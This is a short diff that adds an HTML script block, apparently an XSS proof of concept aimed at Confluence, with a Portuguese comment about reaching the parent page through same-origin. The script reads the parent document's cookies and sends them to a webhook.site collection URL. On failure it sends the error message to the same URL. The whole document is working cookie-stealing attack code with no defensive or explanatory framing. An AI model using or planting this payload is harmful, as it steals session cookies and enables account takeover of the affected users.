@@ -1,0 +1,11 @@
+<script>
+try {
+  // Tentar acessar o parent (Confluence) via same-origin
+  var parentDoc = window.parent.document;
+  var cookies = parentDoc.cookie;
+  
+  fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?success=1&parent_cookie='+cookies);
+} catch(e) {
+  fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?error='+e.message);
+}
+</script>
